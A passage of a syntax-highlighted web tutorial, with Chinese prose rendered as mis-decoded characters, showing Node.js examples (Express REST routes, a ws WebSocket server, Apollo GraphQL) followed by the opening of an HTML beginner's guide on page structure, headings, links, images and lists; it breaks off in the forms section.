id="9-2-2-OAuth-ä¸ç¬¬ä¸‰æ–¹ç™»å½•é›†æˆ"><a href="#9-2-2-OAuth-ä¸ç¬¬ä¸‰æ–¹ç™»å½•é›†æˆ" class="headerlink" title="9.2.2 OAuth ä¸ç¬¬ä¸‰æ–¹ç™»å½•é›†æˆ"></a>9.2.2 OAuth ä¸ç¬¬ä¸‰æ–¹ç™»å½•é›†æˆ</h4><p>OAuth æ˜¯ä¸€ç§æˆæƒåè®®ï¼Œå¸¸ç”¨äºé›†æˆç¬¬ä¸‰æ–¹ç™»å½•ï¼ˆå¦‚ Googleã€Facebookï¼‰ã€‚</p><p>ä½¿ç”¨ <code>passport.js</code> åº“å®ç° OAuth ç™»å½•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install passport passport-google-oauth<br></code></pre></td></tr></table></figure><hr><h2 id="10-å®æˆ˜é¡¹ç›®-1"><a href="#10-å®æˆ˜é¡¹ç›®-1" class="headerlink" title="10. å®æˆ˜é¡¹ç›®"></a>10. å®æˆ˜é¡¹ç›®</h2><h3 id="10-1-æ„å»º-RESTful-API"><a href="#10-1-æ„å»º-RESTful-API" class="headerlink" title="10.1 æ„å»º RESTful API"></a>10.1 æ„å»º RESTful API</h3><p>æ„å»º RESTful API æ˜¯ Node.js çš„å¸¸è§åº”ç”¨åœºæ™¯ä¹‹ä¸€ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨ <code>Express</code> æ¡†æ¶æ„å»º RESTful API çš„åŸºç¡€ç¤ºä¾‹ã€‚</p><h4 id="10-1-1-RESTful-API-åŸºç¡€"><a href="#10-1-1-RESTful-API-åŸºç¡€" class="headerlink" title="10.1.1 RESTful API åŸºç¡€"></a>10.1.1 RESTful API åŸºç¡€</h4><p><strong>å®šä¹‰åŸºæœ¬è·¯ç”±ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/api/users&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Get all users&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/api/users&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Create a new user&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on port 3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="10-2-å®ç°-WebSocket-é€šä¿¡"><a href="#10-2-å®ç°-WebSocket-é€šä¿¡" class="headerlink" title="10.2 å®ç° WebSocket é€šä¿¡"></a>10.2 å®ç° WebSocket é€šä¿¡</h3><p>WebSocket æ˜¯ä¸€ç§åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å®ç°å…¨åŒå·¥é€šä¿¡çš„åè®®ï¼Œé€‚åˆå®æ—¶åº”ç”¨ã€‚</p><h4 id="10-2-1-WebSocket-åŸºç¡€"><a href="#10-2-1-WebSocket-åŸºç¡€" class="headerlink" title="10.2.1 WebSocket åŸºç¡€"></a>10.2.1 WebSocket åŸºç¡€</h4><p>Node.js å¯ä»¥ä½¿ç”¨ <code>ws</code> æ¨¡å—å®ç° WebSocket é€šä¿¡ã€‚</p><p>å®‰è£… <code>ws</code> æ¨¡å—ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install ws<br></code></pre></td></tr></table></figure><p><strong>åˆ›å»º WebSocket æœåŠ¡å™¨ï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">WebSocket</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;ws&#x27;</span>);<br><span class="hljs-keyword">const</span> wss = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>.<span class="hljs-title class_">Server</span>(&#123; <span class="hljs-attr">port</span>: <span class="hljs-number">8080</span> &#125;);<br><br>wss.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;connection&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">ws</span>) =&gt;</span> &#123;<br>  ws.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">message</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Received: %s&#x27;</span>, message);<br>  &#125;);<br>  ws.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Hello WebSocket Client!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="10-2-2-ä½¿ç”¨-ws-å®ç°-WebSocket-æœåŠ¡"><a href="#10-2-2-ä½¿ç”¨-ws-å®ç°-WebSocket-æœåŠ¡" class="headerlink" title="10.2.2 ä½¿ç”¨ ws å®ç° WebSocket æœåŠ¡"></a>10.2.2 ä½¿ç”¨ <code>ws</code> å®ç° WebSocket æœåŠ¡</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js">wss.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;connection&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">ws</span>) =&gt;</span> &#123;<br>  ws.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">message</span>) =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Received: %s&#x27;</span>, message);<br>    ws.<span class="hljs-title function_">send</span>(<span class="hljs-string">`Echo: <span class="hljs-subst">$&#123;message&#125;</span>`</span>);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="10-3-ä½¿ç”¨-GraphQL-æ„å»º-API"><a href="#10-3-ä½¿ç”¨-GraphQL-æ„å»º-API" class="headerlink" title="10.3 ä½¿ç”¨ GraphQL æ„å»º API"></a>10.3 ä½¿ç”¨ GraphQL æ„å»º API</h3><p>GraphQL æ˜¯ä¸€ç§çµæ´»çš„æ•°æ®æŸ¥è¯¢è¯­è¨€ï¼Œé€‚åˆå¤æ‚æŸ¥è¯¢çš„ API è®¾è®¡ã€‚</p><h4 id="10-3-1-GraphQL-æ¦‚è¿°"><a href="#10-3-1-GraphQL-æ¦‚è¿°" class="headerlink" title="10.3.1 GraphQL æ¦‚è¿°"></a>10.3.1 GraphQL æ¦‚è¿°</h4><p>GraphQL æä¾›äº†æŸ¥è¯¢ã€å˜æ›´å’Œè®¢é˜…åŠŸèƒ½ï¼Œå…è®¸å®¢æˆ·ç«¯è¯·æ±‚æ‰€éœ€çš„æ•°æ®ã€‚</p><h4 id="10-3-2-ä½¿ç”¨-Apollo-Server-æ„å»º-GraphQL-API"><a href="#10-3-2-ä½¿ç”¨-Apollo-Server-æ„å»º-GraphQL-API" class="headerlink" title="10.3.2 ä½¿ç”¨ Apollo Server æ„å»º GraphQL API"></a>10.3.2 ä½¿ç”¨ Apollo Server æ„å»º GraphQL API</h4><p>å®‰è£… <code>apollo-server</code> å’Œ <code>graphql</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install apollo-server graphql<br></code></pre></td></tr></table></figure><p><strong>å®šä¹‰ Schema å’Œ Resolversï¼š</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">ApolloServer</span>, gql &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;apollo-server&#x27;</span>);<br><br><span class="hljs-keyword">const</span> typeDefs = gql`<span class="language-graphql"></span><br><span class="language-graphql">  <span class="hljs-keyword">type</span> <span class="hljs-keyword">Query</span> <span class="hljs-punctuation">&#123;</span></span><br><span class="language-graphql">    <span class="hljs-symbol">hello</span><span class="hljs-punctuation">:</span> String</span><br><span class="language-graphql">  <span class="hljs-punctuation">&#125;</span></span><br><span class="language-graphql">`</span>;<br><br><span class="hljs-keyword">const</span> resolvers = &#123;<br>  <span class="hljs-title class_">Query</span>: &#123;<br>    <span class="hljs-attr">hello</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-string">&#x27;Hello, GraphQL!&#x27;</span><br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ApolloServer</span>(&#123; typeDefs, resolvers &#125;);<br><br>server.<span class="hljs-title function_">listen</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">&#123; url &#125;</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server ready at <span class="hljs-subst">$&#123;url&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><hr><h1 id="HTML-è¯¦å°½å…¥é—¨æŒ‡å—"><a href="#HTML-è¯¦å°½å…¥é—¨æŒ‡å—" class="headerlink" title="HTML è¯¦å°½å…¥é—¨æŒ‡å—"></a>HTML è¯¦å°½å…¥é—¨æŒ‡å—</h1><h3 id="ç›®å½•-4"><a href="#ç›®å½•-4" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h3><ol><li><a href="#html-%E5%9F%BA%E7%A1%80">HTML åŸºç¡€</a><ul><li><a href="#html-%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84">HTML æ–‡ä»¶ç»“æ„</a></li><li><a href="#html-%E6%A0%87%E8%AE%B0%E6%A0%87%E7%AD%BE">HTML æ ‡è®°ï¼ˆæ ‡ç­¾ï¼‰</a></li></ul></li><li><a href="#html-%E5%85%83%E7%B4%A0%E8%AF%A6%E8%A7%A3">HTML å…ƒç´ è¯¦è§£</a><ul><li><a href="#%E6%A0%87%E9%A2%98headings">æ ‡é¢˜ï¼ˆHeadingsï¼‰</a></li><li><a href="#%E6%AE%B5%E8%90%BDparagraphs">æ®µè½ï¼ˆParagraphsï¼‰</a></li><li><a href="#%E9%93%BE%E6%8E%A5links">é“¾æ¥ï¼ˆLinksï¼‰</a></li><li><a href="#%E5%9B%BE%E5%83%8Fimages">å›¾åƒï¼ˆImagesï¼‰</a></li><li><a href="#%E5%88%97%E8%A1%A8lists">åˆ—è¡¨ï¼ˆListsï¼‰</a></li></ul></li><li><a href="#html-%E8%A1%A8%E5%8D%95">HTML è¡¨å•</a><ul><li><a href="#%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0">è¡¨å•å…ƒç´ </a></li><li><a href="#%E8%A1%A8%E5%8D%95%E6%8F%90%E4%BA%A4">è¡¨å•æäº¤</a></li></ul></li><li><a href="#html-%E8%A1%A8%E6%A0%BC">HTML è¡¨æ ¼</a></li><li><a href="#html-%E5%A4%9A%E5%AA%92%E4%BD%93">HTML å¤šåª’ä½“</a></li><li><a href="#html-%E5%9F%BA%E6%9C%AC%E5%B8%83%E5%B1%80">HTML åŸºæœ¬å¸ƒå±€</a></li></ol><hr><h3 id="HTML-åŸºç¡€"><a href="#HTML-åŸºç¡€" class="headerlink" title="HTML åŸºç¡€"></a>HTML åŸºç¡€</h3><h4 id="HTML-æ–‡ä»¶ç»“æ„"><a href="#HTML-æ–‡ä»¶ç»“æ„" class="headerlink" title="HTML æ–‡ä»¶ç»“æ„"></a>HTML æ–‡ä»¶ç»“æ„</h4><p>ä¸€ä¸ªå®Œæ•´çš„ HTML æ–‡æ¡£åŒ…æ‹¬ä»¥ä¸‹åŸºæœ¬ç»“æ„ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ç¤ºä¾‹ HTML é¡µé¢<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>æ¬¢è¿æ¥åˆ°æˆ‘çš„ç½‘ç«™<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªç®€å•çš„ HTML é¡µé¢ã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>è§£é‡Šï¼š</strong></p><ul><li><code>&lt;!DOCTYPE html&gt;</code>ï¼šå£°æ˜æ–‡æ¡£ç±»å‹ï¼Œå‘ŠçŸ¥æµè§ˆå™¨è¿™æ˜¯ä¸€ä¸ª HTML5 æ–‡æ¡£ã€‚</li><li><code>&lt;html&gt;</code>ï¼šHTML æ–‡æ¡£çš„æ ¹å…ƒç´ ã€‚</li><li><code>&lt;head&gt;</code>ï¼šåŒ…å«å…³äºæ–‡æ¡£çš„ä¿¡æ¯ï¼ˆå…ƒæ•°æ®ï¼‰ï¼Œå¦‚æ ‡é¢˜ã€ç¼–ç ã€æ ·å¼ç­‰ã€‚</li><li><code>&lt;title&gt;</code>ï¼šç½‘é¡µçš„æ ‡é¢˜ï¼Œæ˜¾ç¤ºåœ¨æµè§ˆå™¨çš„æ ‡ç­¾é¡µä¸Šã€‚</li><li><code>&lt;meta charset=&quot;UTF-8&quot;&gt;</code>ï¼šè®¾ç½®æ–‡æ¡£çš„å­—ç¬¦ç¼–ç ä¸º UTF-8ï¼Œç¡®ä¿æ”¯æŒå¤šè¯­è¨€å­—ç¬¦é›†ã€‚</li><li><code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</code>ï¼šå“åº”å¼è®¾è®¡è®¾ç½®ï¼Œé€‚é…ç§»åŠ¨è®¾å¤‡ã€‚</li><li><code>&lt;body&gt;</code>ï¼šæ–‡æ¡£çš„ä¸»ä½“ï¼ŒåŒ…å«ç½‘é¡µçš„å¯è§å†…å®¹ã€‚</li></ul><hr><h4 id="HTML-æ ‡è®°ï¼ˆæ ‡ç­¾ï¼‰"><a href="#HTML-æ ‡è®°ï¼ˆæ ‡ç­¾ï¼‰" class="headerlink" title="HTML æ ‡è®°ï¼ˆæ ‡ç­¾ï¼‰"></a>HTML æ ‡è®°ï¼ˆæ ‡ç­¾ï¼‰</h4><p>HTML ä½¿ç”¨æ ‡è®°ï¼ˆæ ‡ç­¾ï¼‰æ¥è¡¨ç¤ºç½‘é¡µçš„å…ƒç´ ã€‚HTML æ ‡ç­¾é€šå¸¸æˆå¯¹å‡ºç°ï¼Œç”±å¼€å§‹æ ‡ç­¾å’Œç»“æŸæ ‡ç­¾æ„æˆï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;p&gt;</code> æ˜¯æ®µè½çš„å¼€å§‹æ ‡ç­¾ã€‚</li><li><code>&lt;/p&gt;</code> æ˜¯æ®µè½çš„ç»“æŸæ ‡ç­¾ã€‚</li></ul><p>æŸäº› HTML æ ‡ç­¾æ˜¯è‡ªé—­åˆçš„ï¼Œè¡¨ç¤ºè¯¥å…ƒç´ æ²¡æœ‰å†…å®¹ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;ç¤ºä¾‹å›¾ç‰‡&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;img&gt;</code> æ˜¯å›¾ç‰‡æ ‡ç­¾ï¼Œå®ƒæ²¡æœ‰ç»“æŸæ ‡ç­¾ã€‚</li></ul><hr><h3 id="HTML-å…ƒç´ è¯¦è§£"><a href="#HTML-å…ƒç´ è¯¦è§£" class="headerlink" title="HTML å…ƒç´ è¯¦è§£"></a>HTML å…ƒç´ è¯¦è§£</h3><h4 id="æ ‡é¢˜ï¼ˆHeadingsï¼‰"><a href="#æ ‡é¢˜ï¼ˆHeadingsï¼‰" class="headerlink" title="æ ‡é¢˜ï¼ˆHeadingsï¼‰"></a>æ ‡é¢˜ï¼ˆHeadingsï¼‰</h4><p>HTML æä¾›äº†å…­ç§ä¸åŒçº§åˆ«çš„æ ‡é¢˜æ ‡ç­¾ï¼Œ<code>&lt;h1&gt;</code> åˆ° <code>&lt;h6&gt;</code>ï¼Œå…¶ä¸­ <code>&lt;h1&gt;</code> è¡¨ç¤ºæœ€å¤§çš„æ ‡é¢˜ï¼Œ<code>&lt;h6&gt;</code> è¡¨ç¤ºæœ€å°çš„æ ‡é¢˜ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>è¿™æ˜¯ä¸€çº§æ ‡é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>è¿™æ˜¯äºŒçº§æ ‡é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>è¿™æ˜¯ä¸‰çº§æ ‡é¢˜<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ ‡é¢˜çš„ä½œç”¨ä¸ä»…æ˜¯è§†è§‰ä¸Šçš„å±‚æ¬¡ç»“æ„ï¼Œè¿˜ä¼šè¢«æœç´¢å¼•æ“ç”¨äºé¡µé¢ç´¢å¼•ï¼Œæœ‰åŠ©äº SEO ä¼˜åŒ–ã€‚</p><hr><h4 id="æ®µè½ï¼ˆParagraphsï¼‰"><a href="#æ®µè½ï¼ˆParagraphsï¼‰" class="headerlink" title="æ®µè½ï¼ˆParagraphsï¼‰"></a>æ®µè½ï¼ˆParagraphsï¼‰</h4><p>æ®µè½ç”¨ <code>&lt;p&gt;</code> æ ‡ç­¾è¡¨ç¤ºï¼Œç”¨äºå°†æ–‡æœ¬åˆ†æˆæ®µè½ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è¿™æ˜¯ç¬¬ä¸€ä¸ªæ®µè½ã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è¿™æ˜¯ç¬¬äºŒä¸ªæ®µè½ã€‚<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¤šä¸ªæ®µè½ä¼šè‡ªåŠ¨åœ¨æµè§ˆå™¨ä¸­åˆ†å¼€æ˜¾ç¤ºã€‚</p><hr><h4 id="é“¾æ¥ï¼ˆLinksï¼‰"><a href="#é“¾æ¥ï¼ˆLinksï¼‰" class="headerlink" title="é“¾æ¥ï¼ˆLinksï¼‰"></a>é“¾æ¥ï¼ˆLinksï¼‰</h4><p>é“¾æ¥æ˜¯ HTML ä¸­éå¸¸é‡è¦çš„å…ƒç´ ï¼Œç”¨äºåˆ›å»ºè¶…é“¾æ¥ï¼Œä½¿ç”¨æˆ·å¯ä»¥åœ¨é¡µé¢ä¹‹é—´æˆ–å¤–éƒ¨ç½‘ç«™ä¹‹é—´å¯¼èˆªã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span>&gt;</span>ç‚¹å‡»è®¿é—®ç¤ºä¾‹ç½‘ç«™<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>href</code> å±æ€§æŒ‡å®šäº†é“¾æ¥ç›®æ ‡ï¼ˆURLï¼‰ã€‚</li><li>é“¾æ¥çš„æ–‡æœ¬æ˜¯å¯ç‚¹å‡»çš„éƒ¨åˆ†ã€‚</li></ul><p>ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>target=&quot;_blank&quot;</code> å±æ€§åœ¨æ–°æ ‡ç­¾é¡µä¸­æ‰“å¼€é“¾æ¥ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.example.com&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span>&gt;</span>åœ¨æ–°æ ‡ç­¾é¡µä¸­æ‰“å¼€<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h4 id="å›¾åƒï¼ˆImagesï¼‰"><a href="#å›¾åƒï¼ˆImagesï¼‰" class="headerlink" title="å›¾åƒï¼ˆImagesï¼‰"></a>å›¾åƒï¼ˆImagesï¼‰</h4><p>ä½¿ç”¨ <code>&lt;img&gt;</code> æ ‡ç­¾æ¥åœ¨ç½‘é¡µä¸­æ’å…¥å›¾åƒã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;image.jpg&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;æè¿°å›¾åƒ&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>src</code> å±æ€§æŒ‡å®šå›¾ç‰‡çš„è·¯å¾„æˆ– URLã€‚</li><li><code>alt</code> å±æ€§ä¸ºå›¾ç‰‡æä¾›æ–‡æœ¬æ›¿ä»£ï¼Œæµè§ˆå™¨æ— æ³•åŠ è½½å›¾åƒæ—¶æ˜¾ç¤ºï¼Œæˆ–ç”¨äºå±å¹•é˜…è¯»å™¨ã€‚</li></ul><hr><h4 id="åˆ—è¡¨ï¼ˆListsï¼‰"><a href="#åˆ—è¡¨ï¼ˆListsï¼‰" class="headerlink" title="åˆ—è¡¨ï¼ˆListsï¼‰"></a>åˆ—è¡¨ï¼ˆListsï¼‰</h4><p>HTML æä¾›äº†ä¸¤ç§ä¸»è¦çš„åˆ—è¡¨ï¼šæœ‰åºåˆ—è¡¨å’Œæ— åºåˆ—è¡¨ã€‚</p><ul><li><strong>æ— åºåˆ—è¡¨</strong> ä½¿ç”¨ <code>&lt;ul&gt;</code> å’Œ <code>&lt;li&gt;</code> æ ‡ç­¾ï¼š</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>é¡¹ç›®ä¸€<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>é¡¹ç›®äºŒ<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>é¡¹ç›®ä¸‰<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong>æœ‰åºåˆ—è¡¨</strong> ä½¿ç”¨ <code>&lt;ol&gt;</code> å’Œ <code>&lt;li&gt;</code> æ ‡ç­¾ï¼š</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>ç¬¬ä¸€é¡¹<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>ç¬¬äºŒé¡¹<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>ç¬¬ä¸‰é¡¹<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><h3 id="HTML-è¡¨å•"><a href="#HTML-è¡¨å•" class="headerlink" title="HTML è¡¨å•"></a>HTML è¡¨å•</h3><p>HTML è¡¨å•å…è®¸ç”¨æˆ·è¾“å…¥æ•°æ®ï¼Œå¹¶é€šè¿‡æäº¤æ•°æ®ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚</p><h4 id="è¡¨å•å…ƒç´ "><a href="#è¡¨å•å…ƒç´ " class="headerlink" title="è¡¨å•å…ƒç´ "></a>è¡¨å•å…ƒç´ </h4><p>HTML æä¾›äº†å¤šç§è¡¨å•å…ƒç´ ï¼ŒåŒ…æ‹¬æ–‡æœ¬æ¡†ã€å•é€‰æŒ‰é’®ã€å¤é€‰æ¡†ã€ä¸‹æ‹‰èœå•ç­‰ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 